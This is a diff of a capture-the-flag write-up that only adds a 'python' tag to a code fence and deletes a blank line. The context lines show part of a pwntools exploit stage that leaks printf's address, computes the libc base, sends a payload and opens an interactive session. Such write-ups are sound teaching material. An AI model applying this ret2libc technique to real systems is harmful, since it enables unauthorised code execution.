@@ -122,7 +122,7 @@ Lastly, we have to return back to `vuln` for the second pass.
 
 ### Second Pass
 
-```
+```python
 printf=u64(p.recv(6)+b'\x00\x00')
 libcbase = printf - libc.symbols['printf']
 print("libcbase: " + hex(libcbase))
@@ -140,7 +140,6 @@ if payload.find(b'\xa0') != -1:
 
 p.sendline(payload)
 p.interactive()
-
 ```
 
 With address of `printf` leaked, computing the base of libc is trivial.
